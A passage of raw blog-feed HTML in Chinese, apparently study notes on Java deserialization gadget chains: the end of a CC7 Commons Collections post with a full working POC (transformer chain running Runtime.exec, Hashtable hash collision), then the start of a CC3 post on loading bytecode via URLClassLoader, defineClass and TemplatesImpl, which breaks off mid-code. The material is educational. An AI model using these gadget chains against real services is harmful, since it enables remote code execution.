class="hljs-comment">//反序列化</span><br>    <span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K)s.readObject();<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V)s.readObject();<br>        <span class="hljs-comment">// synch could be eliminated for performance</span><br>        reconstitutionPut(table, key, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="构造："><a href="#构造：" class="headerlink" title="构造："></a>构造：</h3><p><strong>ysoserial：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855518.png"></p><p>结合上述代码的分析，ysoserial 这里要写 <strong>俩个 put 的作用</strong>便是：</p><p>在 Hashtable 放入俩个 lazyMap ,制造“冲突”，迫使他们进入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>        <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>同时要让俩个元素的哈希值相同【(e.hash &#x3D;&#x3D; hash)】，然后就会触发 <code>key.equals()</code> 的比较。<br>而 <code>equals()</code> 内部会调用到 <code>LazyMap.get()</code>，最终触发 <code>transformerChain</code> 执行恶意代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//首先创建俩个map</span><br><span class="hljs-type">Map</span> <span class="hljs-variable">hashMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-comment">//俩个元素的hash值一样</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);<br>        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br>        <br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);<br>        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(lazyMap2, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">// 这里的问题在urldns 和 CC6 中均有提及</span><br>        <span class="hljs-comment">//https://www.yuque.com/taohuayuanpang/qxcvxi/qvul6kkfwvcanocn#ZLUWn</span><br>        lazyMap1.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p><font style="color:rgb(44, 62, 80);">hash相同的值：</font></p><p>yy与zZ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021856813.png"><br>Ea与FB</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021856867.png"></p></blockquote><h3 id="完整POC："><a href="#完整POC：" class="headerlink" title="完整POC："></a>完整POC：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.CC7;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// CC1-LazyMap</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br><br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);<br>        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);<br>        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">//        System.out.println(lazyMap1.hashCode());</span><br><span class="hljs-comment">//        System.out.println(lazyMap2.hashCode());</span><br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(lazyMap2, <span class="hljs-number">1</span>);<br><br>        lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(chainedTransformer, transformers);<br><br><br>        serialize(hashtable);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021856148.png"></p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021856619.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
      <tag>CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC3</title>
    <link href="/2025/09/01/CC3/"/>
    <url>/2025/09/01/CC3/</url>
    
    <content type="html"><![CDATA[<p>再次深入学习动态加载字节码：</p><h1 id="动态加载字节码"><a href="#动态加载字节码" class="headerlink" title="动态加载字节码"></a>动态加载字节码</h1><h2 id="1、什么是Java的字节码"><a href="#1、什么是Java的字节码" class="headerlink" title="1、什么是Java的字节码"></a>1、什么是Java的字节码</h2><blockquote><p>严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。</p></blockquote><p>java的核心就是跨平台运行，Java编译的结果–字节码（.class文件）交给 JVM 去运行，同时如果其他语言可以编译为字节码文件，也可以交由 JVM 运行</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011703016.png"></p><h2 id="2、动态加载字节码的方法"><a href="#2、动态加载字节码的方法" class="headerlink" title="2、动态加载字节码的方法"></a>2、动态加载字节码的方法</h2><h3 id="2-1-利用-URLClassLoader-加载远程-class-文件"><a href="#2-1-利用-URLClassLoader-加载远程-class-文件" class="headerlink" title="2.1 利用 URLClassLoader 加载远程 class 文件"></a>2.1 利用 URLClassLoader 加载远程 class 文件</h3><blockquote><p>解释 URLClassLoader 的工作过程实际上就是在解释默认的Java类加载器的工作流程。</p><p>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p><ul><li>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</li></ul><p>我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是非 file 协议的情况下，最常见的就是 http 协议。</p></blockquote><h4 id="2-1-1-file-协议"><a href="#2-1-1-file-协议" class="headerlink" title="2.1.1 file 协议"></a>2.1.1 file 协议</h4><p>先编译一个文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span>(IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011703146.png"></p><p>使用 URLClassLoader 加载：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassLoader_Calc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">URLClassLoader</span>  <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;file:///E:\\&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011703834.png"></p><h4 id="2-1-2-http-协议"><a href="#2-1-2-http-协议" class="headerlink" title="2.1.2 http 协议"></a>2.1.2 http 协议</h4><p>先用python 起一个 http 服务：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -m http.server <span class="hljs-number">8999</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011703718.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloClassLoader</span> &#123;<br>    public static void main(String[] args) throws MalformedURLException, InstantiationException, IllegalAccessException, ClassNotFoundException &#123;<br>        URL[] urls = &#123;new URL(<span class="hljs-string">&quot;http://localhost:8999/&quot;</span>)&#125;;<br>        URLClassLoader classLoader = URLClassLoader.newInstance(urls);<br>        Class c = classLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        c.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-利用-ClassLoader-defineClass-直接加载字节码"><a href="#2-2-利用-ClassLoader-defineClass-直接加载字节码" class="headerlink" title="2.2 利用 ClassLoader#defineClass 直接加载字节码"></a>2.2 利用 ClassLoader#defineClass 直接加载字节码</h3><blockquote><p>不管是加载远程class文件，还是本地的class或jar文件，Java都经历的是下面这三个方法调用：</p></blockquote><p>ClassLoader#loadClass -&gt; ClassLoader#findClass -&gt; ClassLoader#defineClass</p><ul><li><code>loadClass</code> 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass</li><li><code>findClass</code> 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass</li><li><code>defineClass</code> 的作用是处理前面传入的字节码，将其处理成真正的Java类</li></ul><p>学习如何让系统的 defineClass 来直接加载字节码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefineClass</span> &#123;<br>    public static void main(String[] args) throws Exception &#123;<br>        //获取 ClassLoader 的 defineClass 方法<br>        Method defineClass = ClassLoader.<span class="hljs-keyword">class</span>.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.<span class="hljs-keyword">class</span>, byte[].<span class="hljs-keyword">class</span>, <span class="hljs-built_in">int</span>.<span class="hljs-keyword">class</span>, <span class="hljs-built_in">int</span>.<span class="hljs-keyword">class</span>);<br>        defineClass.setAccessible(true);<br><br>        //将 base64 字符串解码成 <span class="hljs-keyword">class</span> <span class="hljs-title class_">文件的字节码</span><br>        byte[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br>        //在系统类加载器上调用 defineClass，将字节数组定义成一个 Class 对象<br>        Class hello = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>        //调用无参构造<br>        hello.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704376.png"></p><p>跟进 <font style="color:#080808;background-color:#ffffff;">defineClass 看到它是一个 protected 属性，无法直接访问，所以上述例子中用反射调用。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704651.png"></p><h3 id="2-3-利用-TemplatesImpl-加载字节码"><a href="#2-3-利用-TemplatesImpl-加载字节码" class="headerlink" title="2.3 利用 TemplatesImpl 加载字节码"></a>2.3 利用 TemplatesImpl 加载字节码</h3><p><font style="color:#080808;background-color:#ffffff;">defineClass 方法无法直接使用，但是呢，TemplatesImpl 类中给我们提供了一个入口：</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704748.png"></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl 类继承了 </font>ClassLoader ，<font style="color:#080808;background-color:#ffffff;">并重写 defineClass 方法，并且是可以被外部调用</font></p><p>现在以 <font style="color:#080808;background-color:#ffffff;">TemplatesImpl#defineClass 为终点</font>跟踪一下这条链：</p><p><font style="color:#080808;background-color:#ffffff;">查找用法：TemplatesImpl.TransletClassLoader.defineClass</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704129.png"></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl.defineTransletClasses.defineClass</font></p><p><font style="color:#080808;background-color:#ffffff;">defineTransletClasses 函数还是私有的，继续找</font></p><p><font style="color:#080808;background-color:#ffffff;">这里查找 defineTransletClasses 的用法后，找到三个结果</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704550.png"></p><p><font style="color:#080808;background-color:#ffffff;">getTransletClasses 和 getTransletIndex() 都是返回了一个储存值，用于后续操作</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704137.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704963.png"></p><p>而 <font style="color:#080808;background-color:#ffffff;">getTransletInstance 中  .newInstance()  会调用无参构造创建一个实例，可以用于我们后续的代码执行所以重点跟它</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704644.png"></p><p>来到 <font style="color:#080808;background-color:#ffffff;">newTransformer 函数，它是公有的，到这里就可以了</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704704.png"></p><p><strong>小总结一下：</strong></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl.TransletClassLoader.defineClass</font></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl.defineTransletClasses.defineClass</font></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl.getTransletInstance.defineTransletClasses</font></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl.newTransformer.getTransletInstance</font></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl</font></p><p><font style="color:#080808;background-color:#ffffff;">newTransformer</font></p><p><font style="color:#080808;background-color:#ffffff;">getTransletInstance</font></p><p><font style="color:#080808;background-color:#ffffff;">defineTransletClasses</font></p><p><font style="color:#080808;background-color:#ffffff;">defineClass</font></p><p><font style="color:#080808;background-color:#ffffff;">TransletClassLoader.defineClass</font></p><p>接下来构造 POC：</p><p>首先满足俩个条件：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704837.png"></p><p>进入 <font style="color:#080808;background-color:#ffffff;">defineTransletClasses -&gt; newInstance</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704050.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011716057.png"></p><p><font style="color:#080808;background-color:#ffffff;">前后结合一下，将 _bytecodes 构造为一维数组套二维数组：</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br></code></pre></td></tr></table></figure><p>_tfactory 这个变量被标记为  <font style="color:#080808;background-color:#ffffff;">transient （不可序列化）</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705518.png"></p><p>然后在 readObject 中找：看到已经被赋值了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705580.png"></p><p>先来一个要执行的类：将其编译后放在指定位置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>  &#123;<br>    <span class="hljs-keyword">static</span>  &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplateImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> 